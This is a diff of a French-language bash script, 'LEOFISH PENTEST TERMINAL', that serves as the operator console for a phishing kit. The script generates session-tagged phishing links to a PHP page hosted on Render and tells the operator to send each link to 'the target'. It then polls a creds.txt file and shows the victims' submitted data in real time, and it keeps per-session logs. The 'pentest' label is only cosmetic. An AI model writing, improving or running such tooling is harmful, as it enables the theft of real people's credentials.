@@ -1,144 +1,220 @@
 #!/bin/bash
 
-# Couleurs pro
-RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' BLUE='\033[0;34m' PURPLE='\033[0;35m' CYAN='\033[0;36m' WHITE='\033[1;37m' NC='\033[0m'
+# ══════════════════════════════════════════
+#         LEOFISH PENTEST TERMINAL
+# ══════════════════════════════════════════
+
+# Couleurs
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m'
 
 # Fichiers
 CREDIT_FILE="credit.text"
 HELP_FILE="help.text"
-SESSION_LOGS="sessions/$(date +%Y%m%d_%H%M%S).log"
+LOGS_FILE="creds.txt"
 
-# URL Render (CHANGE ÇA)
-APP_URL="https://leofish-tool-v1-0.onrender.com/index.php"
+# URL de ton app Render (modifie ici)
+APP_URL="https://ton-app.onrender.com"
 
 # Créer dossier sessions
 mkdir -p sessions
 
+# ══════════════════════════════════════════
+# BANNIÈRE + LOGO
+# ══════════════════════════════════════════
 show_banner() {
     clear
     echo -e "${CYAN}"
-    cat "$CREDIT_FILE"
+    if [ -f "$CREDIT_FILE" ]; then
+        cat "$CREDIT_FILE"
+    fi
     echo -e "${NC}"
     echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
     echo -e "${WHITE}║${YELLOW}                    LEOFISH PENTEST TERMINAL v1.0                    ${WHITE}║${NC}"
-    echo -e "${WHITE}║${GREEN}                    Victim → Hacker Monitoring                     ${WHITE}║${NC}"
+    echo -e "${WHITE}║${GREEN}                    Victim → Hacker Monitoring                        ${WHITE}║${NC}"
     echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
 }
-cat credit.text
-# Générer lien + monitoring temps réel
+
+# ══════════════════════════════════════════
+# GÉNÉRER LIEN + MONITORING
+# ══════════════════════════════════════════
 generate_campaign() {
     show_banner
     echo -e "${PURPLE}🎯 NOUVELLE CAMPAGNE PENTEST${NC}"
-    echo -e "${YELLOW}Génération du lien de phishing...${NC}"
-    
-    # ID unique pour cette session
-    SESSION_ID=$(date +%s)_$(openssl rand -hex 8 2>/dev/null || echo $RANDOM)
+    echo ""
+
+    # Lancer le serveur Render (ping pour le réveiller)
+    echo -e "${YELLOW}⚡ Connexion au serveur Render...${NC}"
+    curl -s --max-time 10 "$APP_URL" > /dev/null 2>&1
+    if [ $? -eq 0 ]; then
+        echo -e "${GREEN}✅ Serveur en ligne${NC}"
+    else
+        echo -e "${YELLOW}⚠️  Serveur en démarrage (Render cold start, patiente 30s...)${NC}"
+    fi
+    echo ""
+
+    # ID unique de session
+    SESSION_ID=$(date +%s)_$(openssl rand -hex 8 2>/dev/null || echo $RANDOM$RANDOM)
+
+    # Lien vers index.php avec l'ID session
     PHISH_LINK="${APP_URL}/index.php?session=${SESSION_ID}"
-    
-    # Sauvegarde session
-    echo "=== SESSION PENTEST $(date) ===" > "$SESSION_LOGS"
-    echo "Lien envoyé: $PHISH_LINK" >> "$SESSION_LOGS"
-    
-    echo -e "${GREEN}✅ ${WHITE}LIEN GÉNÉRÉ${GREEN} ✅${NC}"
+
+    # Log fichier de cette session
+    SESSION_LOG="sessions/${SESSION_ID}.log"
+    echo "=== SESSION PENTEST $(date) ===" > "$SESSION_LOG"
+    echo "Lien: $PHISH_LINK" >> "$SESSION_LOG"
+
+    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║${WHITE}  ✅  LIEN GÉNÉRÉ — ENVOIE À LA CIBLE :                              ${GREEN}║${NC}"
+    echo -e "${GREEN}╠══════════════════════════════════════════════════════════════════════╣${NC}"
+    echo -e "${GREEN}║  ${CYAN}${PHISH_LINK}${NC}"
+    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
-    echo -e "${CYAN}${PHISH_LINK}${NC}"
+    echo -e "${YELLOW}📤 Copie ce lien et envoie-le à la cible${NC}"
+    echo -e "${PURPLE}⏳ Dès que la cible l'ouvre, les logs apparaîtront ici${NC}"
     echo ""
-    echo -e "${YELLOW}📤 Copie ce lien et envoie à la cible${NC}"
-    echo -e "${PURPLE}⏳ Attente de l'interaction... (Ctrl+C pour arrêter)${NC}"
-    
-    read -p $'\nAppuyez sur Entrée pour commencer le monitoring...'
-    
-    # MONITORING TEMPS RÉEL
-    monitor_victim "$SESSION_ID" "$SESSION_LOGS"
+    read -rp "$(echo -e "${WHITE}Appuie sur Entrée pour démarrer le monitoring...${NC}")"
+
+    # Lancer le monitoring
+    monitor_logs "$SESSION_ID" "$SESSION_LOG"
 }
 
-# Monitoring victim → hacker
-monitor_victim() {
+# ══════════════════════════════════════════
+# MONITORING LOGS TEMPS RÉEL (lit logs.txt)
+# ══════════════════════════════════════════
+monitor_logs() {
     local session_id=$1
-    local log_file=$2
-    
-    clear
+    local session_log=$2
+    local last_line=0
+
     show_banner
-    echo -e "${RED}👁️  ${WHITE}MONITORING LIVE - SESSION: ${CYAN}${session_id}${NC}"
+    echo -e "${RED}👁️  MONITORING LIVE${NC} — Session: ${CYAN}${session_id}${NC}"
     echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
-    
-    # TAIL -F pour monitoring temps réel de terminal.php
+    echo -e "${BLUE}📄 Lecture des logs depuis : ${WHITE}${LOGS_FILE}${NC}"
+    echo ""
+
+    # Créer logs.txt s'il n'existe pas
+    touch "$LOGS_FILE"
+
     while true; do
-        # Appelle ton terminal.php avec l'ID session
-        if [ -f "terminal.php" ]; then
-            php terminal.php "$session_id" 2>/dev/null | while IFS= read -r victim_data; do
-                if [ -n "$victim_data" ]; then
-                    echo -e "${GREEN}[$(date '+%H:%M:%S')]${YELLOW} $victim_data${NC}"
-                    echo "$(date '+%H:%M:%S') - $victim_data" >> "$log_file"
+        # Lire les nouvelles lignes du fichier logs.txt
+        current_lines=$(wc -l < "$LOGS_FILE")
+
+        if [ "$current_lines" -gt "$last_line" ]; then
+            # Afficher uniquement les nouvelles lignes
+            new_data=$(tail -n +"$((last_line + 1))" "$LOGS_FILE")
+
+            while IFS= read -r line; do
+                if [ -n "$line" ]; then
+                    timestamp=$(date '+%H:%M:%S')
+                    echo -e "${GREEN}[${timestamp}]${YELLOW} $line${NC}"
+                    echo "${timestamp} - $line" >> "$session_log"
                 fi
-            done
+            done <<< "$new_data"
+
+            last_line=$current_lines
+        else
+            # Aucune activité → afficher un dot toutes les 5s
+            echo -ne "${BLUE}.${NC}"
         fi
-        
-        # Refresh écran
-        sleep 1
-        clear
-        show_banner
-        echo -e "${RED}👁️  ${WHITE}MONITORING LIVE - SESSION: ${CYAN}${session_id}${NC}"
-        echo -e "${RED}══════════════════════════════════════════════════════════════════════${NC}"
-        tail -15 "$log_file"
-        echo -e "${BLUE}⏳ En attente de nouvelle activité...${NC}"
+
+        sleep 2
     done
 }
 
-# Toutes les sessions
+# ══════════════════════════════════════════
+# VOIR LES SESSIONS ENREGISTRÉES
+# ══════════════════════════════════════════
 show_sessions() {
     show_banner
     echo -e "${YELLOW}📂 TOUTES LES SESSIONS PENTEST${NC}"
-    
-    if [ ! "$(ls -A sessions 2>/dev/null)" ]; then
-        echo -e "${RED}Aucune session${NC}"
+    echo ""
+
+    if [ -z "$(ls -A sessions/ 2>/dev/null)" ]; then
+        echo -e "${RED}  Aucune session enregistrée.${NC}"
     else
-        ls -la sessions/ | tail -n +4 | awk '{print $9" "$6" "$7" "$8}'
+        echo -e "${CYAN}  Fichier                              Date${NC}"
+        echo -e "${WHITE}  ──────────────────────────────────────────────${NC}"
+        ls -lt sessions/ | tail -n +2 | awk '{printf "  %-35s %s %s %s\n", $9, $6, $7, $8}'
         echo ""
-        read -p "Ouvrir une session (nom fichier): " session_file
-        
-        if [ -f "sessions/$session_file" ]; then
-            echo -e "${BLUE}Contenu de $session_file:${NC}"
-            cat "sessions/$session_file" | tail -50
+        read -rp "$(echo -e "${WHITE}Nom du fichier à ouvrir (ou Entrée pour passer) : ${NC}")" session_file
+
+        if [ -n "$session_file" ] && [ -f "sessions/$session_file" ]; then
+            echo ""
+            echo -e "${BLUE}╔══ Contenu de $session_file ══${NC}"
+            cat "sessions/$session_file"
+            echo -e "${BLUE}╚════════════════════════════════${NC}"
         fi
     fi
-    
-    read -p $'\nEntrée...'
+
+    echo ""
+    read -rp "$(echo -e "${WHITE}Entrée pour revenir...${NC}")"
 }
 
-# Help
+# ══════════════════════════════════════════
+# AIDE (lit help.text)
+# ══════════════════════════════════════════
 show_help() {
     show_banner
-    cat "$HELP_FILE"
-    read -p $'\nEntrée...'
+    echo -e "${YELLOW}📖 GUIDE D'UTILISATION${NC}"
+    echo -e "${WHITE}══════════════════════════════════════════════════════════════════════${NC}"
+    echo ""
+    if [ -f "$HELP_FILE" ]; then
+        cat "$HELP_FILE"
+    else
+        echo -e "${RED}  ❌ Fichier help.text introuvable.${NC}"
+    fi
+    echo ""
+    read -rp "$(echo -e "${WHITE}Entrée pour revenir...${NC}")"
 }
 
-# Menu principal
+# ══════════════════════════════════════════
+# MENU PRINCIPAL
+# ══════════════════════════════════════════
 main_menu() {
     while true; do
         show_banner
-        
-        echo -e "${GREEN}1${NC} ${CYAN}🎣${NC} ${YELLOW}Nouvelle campagne (générer lien + monitor)${NC}"
-        echo -e "${GREEN}2${NC} ${CYAN}📂${NC} ${YELLOW}Voir toutes les sessions${NC}"
-        echo -e "${GREEN}3${NC} ${CYAN}📖${NC} ${YELLOW}Aide${NC}"
-        echo -e "${GREEN}0${NC} ${RED}❌ Quitter${NC}"
-        
-        read -p $'\n🎯 ${WHITE}HackerAI Pentest >${NC} ' choice
-        
+
+        echo -e "  ${GREEN}1${NC}  ${CYAN}🎣${NC}  ${YELLOW}Nouvelle campagne${NC}  ${WHITE}(générer lien + monitoring)${NC}"
+        echo -e "  ${GREEN}2${NC}  ${CYAN}📂${NC}  ${YELLOW}Sessions enregistrées${NC}"
+        echo -e "  ${GREEN}3${NC}  ${CYAN}📖${NC}  ${YELLOW}Aide${NC}"
+        echo -e "  ${GREEN}0${NC}  ${RED}❌  Quitter${NC}"
+        echo ""
+        read -rp "$(echo -e "  ${WHITE}LEOFISH ▶ ${NC}")" choice
+
         case $choice in
             1) generate_campaign ;;
             2) show_sessions ;;
             3) show_help ;;
-            0) echo -e "${GREEN}✅ Session terminée${NC}"; exit 0 ;;
-            *) echo -e "${RED}❌ Choix invalide${NC}"; sleep 1 ;;
+            0) echo -e "${GREEN}✅ Session terminée. À bientôt.${NC}"; echo ""; exit 0 ;;
+            *) echo -e "${RED}  ❌ Choix invalide${NC}"; sleep 1 ;;
         esac
     done
 }
 
-# Checks
-[ ! -f "$CREDIT_FILE" ] && { echo "${RED}credit.text manquant${NC}"; exit 1; }
-[ ! -f "terminal.php" ] && echo "${YELLOW}⚠️  terminal.php détecté - assure-toi qu'il retourne les logs${NC}"
+# ══════════════════════════════════════════
+# VÉRIFICATIONS AU DÉMARRAGE
+# ══════════════════════════════════════════
+if [ ! -f "$CREDIT_FILE" ]; then
+    echo -e "${RED}❌ Erreur : credit.text manquant — place ton logo dedans.${NC}"
+    exit 1
+fi
+
+if [ ! -f "$HELP_FILE" ]; then
+    echo -e "${YELLOW}⚠️  help.text manquant — crée le fichier pour afficher l'aide.${NC}"
+fi
+
+if [ ! -f "$LOGS_FILE" ]; then
+    touch "$LOGS_FILE"
+    echo -e "${BLUE}ℹ️  logs.txt créé — terminal.php doit écrire dedans.${NC}"
+    sleep 1
+fi
 
 main_menu
-
